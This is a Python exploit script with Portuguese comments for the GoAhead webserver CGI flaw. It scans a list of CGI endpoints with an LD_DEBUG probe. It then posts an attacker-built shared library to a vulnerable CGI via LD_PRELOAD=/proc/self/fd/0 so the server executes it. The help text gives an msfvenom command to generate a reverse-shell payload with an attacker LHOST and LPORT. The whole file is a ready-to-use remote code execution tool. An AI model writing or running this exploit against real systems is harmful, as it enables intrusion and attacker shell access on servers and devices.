import requests
import os
import argparse
import sys

# Definindo cabeçalhos HTTP padrão
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
}

# Verifica se o arquivo de payload existe
def is_payload_valid(payload_path):
    if not os.path.exists(payload_path):
        print(f"Erro: O arquivo de payload '{payload_path}' não foi encontrado.")
        return False
    return True

# Testa conexão com o host e porta especificados
def test_host_connection(host, port):
    url = f'http://{host}:{port}'
    try:
        response = requests.post(url)
        return response.status_code == 200
    except requests.exceptions.ConnectionError:
        print(f"Erro: Não foi possível conectar-se a {host}:{port}.")
        return False

# Procura por CGIs vulneráveis na URL
def search_exploitable_cgi(target_url):
    cgi_paths = [
        '/', '/cgi-bin/', '/cgi/'
    ]
    
    endpoints = [
        'admin', 'apply', 'check_user', 'config', 'firmware', 'getmac', 'home',
        'index', 'liveView', 'login', 'menu', 'page', 'status', 'sysconf', 
        'upload', 'webcm', 'webviewer', 'welcome'
    ]
    
    print(f"Procurando CGIs vulneráveis no alvo: {target_url}...")

    for base_path in cgi_paths:
        for endpoint in endpoints:
            full_path = f'{target_url}{base_path}{endpoint}?LD_DEBUG=help'
            try:
                response = requests.post(full_path, headers=HEADERS)
                if response.status_code == 200:
                    print(f"CGI vulnerável localizado: {base_path}{endpoint}")
                    return f'{base_path}{endpoint}'
            except requests.exceptions.RequestException:
                continue

    print("Nenhum CGI vulnerável encontrado.")
    return None

# Verifica se a CGI especificada é acessível
def validate_cgi_path(host, port, cgi_path):
    url = f'http://{host}:{port}{cgi_path}?LD_DEBUG=help'
    try:
        response = requests.post(url, headers=HEADERS)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

# Função principal que coordena o ataque
def main(host, port, cgi_path, payload):
    # Valida o arquivo de payload
    if not is_payload_valid(payload):
        return 1
    
    # Valida a conexão com o host e porta
    if not test_host_connection(host, port):
        return 1
    
    # Valida ou encontra o caminho CGI vulnerável
    if not validate_cgi_path(host, port, cgi_path):
        cgi_path = search_exploitable_cgi(f'http://{host}:{port}')
        if not cgi_path:
            return 1

    url = f'http://{host}:{port}{cgi_path}?LD_PRELOAD=/proc/self/fd/0'

    # Envia o payload para o CGI vulnerável
    try:
        with open(payload, 'rb') as file:
            payload_data = file.read()
        
        print("Enviando payload para o servidor...")
        response = requests.post(url, data=payload_data, headers=HEADERS)
        print(f"Payload enviado. Resposta do servidor: {response.status_code}")
    except Exception as e:
        print(f"Erro ao ler ou enviar o payload: {e}")
        return 1

    return 0

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Exploit para vulnerabilidade CGI em GoAhead Webserver\n"
        'Usar msfvenom para gerar o payload;\nExemplo: msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST LPORT -f elf-so -o payload.so',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-rhost', required=True, help='Endereço do host alvo, ex: 192.168.92.153')
    parser.add_argument('-rport', default=8080, help='Porta do GoAhead Webserver. Padrão: 8080')
    parser.add_argument('-cgipath', default='/cgi-bin', help='Caminho do CGI vulnerável no servidor. Padrão: /cgi-bin')
    parser.add_argument('-payload', required=True, help='Caminho para o arquivo de payload ELF-SO, ex: dir/payload.so')

    args = parser.parse_args()
    sys.exit(main(args.rhost, args.rport, args.cgipath, args.payload))
